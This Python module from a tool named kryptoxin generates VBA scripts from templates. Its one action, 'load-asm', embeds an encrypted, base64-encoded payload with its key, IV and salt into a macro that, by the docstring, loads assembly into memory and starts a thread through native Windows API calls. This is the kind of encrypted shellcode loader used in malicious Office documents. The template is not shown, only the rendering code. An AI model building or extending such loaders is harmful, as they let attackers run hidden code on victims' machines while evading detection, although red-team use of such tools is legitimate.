"""
kryptoxin VBA output module.
This module contains functions for the visual basic outputs
"""
from kryptoxin.core.toxin import Toxin
from kryptoxin.core.constants import JINJA_TEMPLATES_VBA
from kryptoxin.core.constants import JINJA_TEMPLATES_ACTSDIR
from kryptoxin.core.constants import JINA_TEMPLATES_FEXT, LANG_VBA
from kryptoxin.output import get_jinja_env

# Create Jinja2 environment variable
env = get_jinja_env()

# Actions templates directories string
tmpl_action_rpath = JINJA_TEMPLATES_VBA + JINJA_TEMPLATES_ACTSDIR


def render_load_asm(t: Toxin):
    """ This function return a VBA script that loads assembly in memory
        and start a new thread using native Windows API function.

    Arguments:
     - ciphertext: the base64 encoded ciphertext (bytes[])
     - password: the password or key (bytes[])
    """
    # cast ciphertext to string
    _ciphertext = t.get_ciphertext(lang=LANG_VBA, width=50)
    _key = t.key.decode()
    _iv = fmt_vbadarray(t.get_iv_decarray())
    _salt = fmt_vbadarray(t.get_salt_decarray())

    template = env.get_template(
        tmpl_action_rpath + "load-asm" + JINA_TEMPLATES_FEXT)

    return template.render(int=int, ciphertext=_ciphertext, mode=t.opmode,
                           key=_key, iv=_iv, salt=_salt,
                           iter=t.pbkdf2_iter, hmac=t.pbkdf2_halg,
                           key_size=t.key_size, action=t.action)


def fmt_vbadarray(darray):
    """ This function convert a decimal byte array to a
        VBA compatible format.
    """
    _darray = "".join("{}, ".format(d) for d in darray)[:-2]

    return _darray


# functions mapping
actions = {
    "load-asm": render_load_asm
}
